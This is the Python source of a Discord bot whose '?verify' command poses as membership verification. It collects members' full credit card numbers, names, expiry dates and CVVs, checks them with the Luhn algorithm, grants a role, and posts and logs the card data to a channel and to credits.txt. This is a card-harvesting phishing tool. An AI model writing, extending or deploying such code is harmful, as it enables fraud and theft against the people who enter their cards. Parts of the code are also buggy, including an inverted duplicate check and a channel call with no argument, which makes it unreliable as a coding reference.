from http import client
import string
import datetime
import discord
from discord.ext import commands
import random
from discord.utils import get

ccinarrays = []

class CreditCard:
    name = None
    creditcard = None
    date = None
    ccv = None
    
    def __init__(self, name, creditcard, date, ccv):
        self.name = name
        self.creditcard = creditcard
        self.date = date
        self.ccv = ccv

intents = discord.Intents.default()
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix='?', description="Credit Card Verifier (will anyone verify?)", intents=intents)

def isInBase(cc):
    for x in ccinarrays:
        if cc.creditcard == x.creditcard:
            return True
        if cc.date == x.date:
            return True
        if cc.ccv == x.ccv:
            return True
    return False

def checkLuhn(cardNo):
    nDigits = len(cardNo)
    nSum = 0
    isSecond = False
     
    for i in range(nDigits - 1, -1, -1):
        d = ord(cardNo[i]) - ord('0')
     
        if (isSecond == True):
            d = d * 2
  
        # We add two digits to handle
        # cases that make two digits after
        # doubling
        nSum += d // 10
        nSum += d % 10
  
        isSecond = not isSecond
     
    if (nSum % 10 == 0):
        return True
    else:
        return False
    

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user} (ID: {bot.user.id})')
    print('------')


@bot.command()
async def verify(ctx, name, creditcard, date, ccv):
    member = ctx.message.author
    r = discord.utils.get(member.guild.roles, name='member')
    channel = 1130523874224775278
    
    if r in member.roles:
        await ctx.send("You stupid or what? Ur verified nice man")
        return
    
    embedfailed = discord.Embed()
    embedfailed.title = "This credit card didn't pass the test :("
    embedfailed.set_image(url="https://cdn3.emoji.gg/emojis/snopes_false.png")

    ccformatted = 0
    ccvformatted = 0
    dateformatted = ""

    try:
        ccformatted = int(creditcard.replace("-", ""))
    except:
        embedfailed.description = "Credit Card isn't an integer"
        await ctx.send(embed=embedfailed)
        return
    
    if len(str(ccformatted)) != 16:
        embedfailed.description = "Credit Card isn't 16 characters long"
        await ctx.send(embed=embedfailed)
        return
    
    if len(str(ccv)) != 3:
        embedfailed.description = "The CCV isn't the corrent length"
        await ctx.send(embed=embedfailed)
        return
    
    try:
        ccvformatted = int(ccv)
    except:
        embedfailed.description = "The CCV isn't a integer"
        await ctx.send(embed=embedfailed)
        return
    
    if len(date.split("/")) != 2:
        embedfailed.description = "The date isn't a correct format."
        await ctx.send(embed=embedfailed)
        return
    
    try:
        if int(date.split("/")[0]) <= 12 and int(date.split("/")[1][2:]) >= int(str(datetime.date.today().year)[2:]):
            if(len(str(int(date.split("/")[0]))) == 1):
                dateformatted = "0" + str(int(date.split("/")[0]))
            else:
                dateformatted = "0" + str(int(date.split("/")[0]))

            dateformatted = dateformatted + "/"

            dateformatted = date.split("/")[1][2:]
        else:
            embedfailed.description = "The date isn't correct"
            await ctx.send(embed=embedfailed)
            return
    except:
        if not int(date.split("/")[0]) <= 12:
            embedfailed.description = "The date isn't correct"
            await ctx.send(embed=embedfailed)
            return
        if int(date.split("/")[1]) <= int(str(datetime.date.today().year)) - 2000:
            embedfailed.description = "The date isn't correct"
            await ctx.send(embed=embedfailed)
            return
        
        if(len(str(int(date.split("/")[0]))) == 1):
                dateformatted = "0" + str(int(date.split("/")[0]))
        else:
                dateformatted = "0" + str(int(date.split("/")[0]))

        dateformatted = dateformatted + "/"

        dateformatted = date.split("/")[1][2:]
    
    if not checkLuhn(str(ccformatted)):
        embedfailed.description = "It's fake ass card."
        await ctx.send(embed=embedfailed)
        return
    
    cctoadd = CreditCard(name, ccformatted, date, ccvformatted)
    if(not isInBase(cctoadd)):
        embedfailed.description = "Already in database nice man"
        await ctx.send(embed=embedfailed)
        return
    
    embedpassed = discord.Embed()
    embedpassed.title = "This credit card passed! :D"
    embedpassed.description = "We will check it later on."
    embedpassed.set_image(url="https://cdn3.emoji.gg/emojis/snopes_true.png")

    await ctx.send(embed=embedpassed)

    await member.add_roles(r)

    await ctx.guild.get_channel().send(f"""
        New Credit Card
        Number: {ccformatted}
        Name: {name}
        CCV: {ccvformatted}
        Date: {dateformatted}
    """)
    
    ccinarrays.append(cctoadd)
    
    with open("credits.txt", "a") as cc:
        cc.write(f"Number: {ccformatted}\n")
        cc.write(f"Name: {name}\n")
        cc.write(f"CCV: {ccvformatted}\n")
        cc.write(f"Date: {dateformatted}\n")
        cc.write(f"---------------------\n")

@bot.command()
async def joined(ctx, member: discord.Member):
    """Says when a member joined."""
    await ctx.send(f'{member.name} joined {discord.utils.format_dt(member.joined_at)}')


@bot.group()
async def cool(ctx):
    """Says if a user is cool.

    In reality this just checks if a subcommand is being invoked.
    """
    if ctx.invoked_subcommand is None:
        await ctx.send(f'No, {ctx.subcommand_passed} is not cool')


@cool.command(name='bot')
async def _bot(ctx):
    """Is the bot cool?"""
    await ctx.send('Yes, the bot is cool.')


bot.run('<token>')
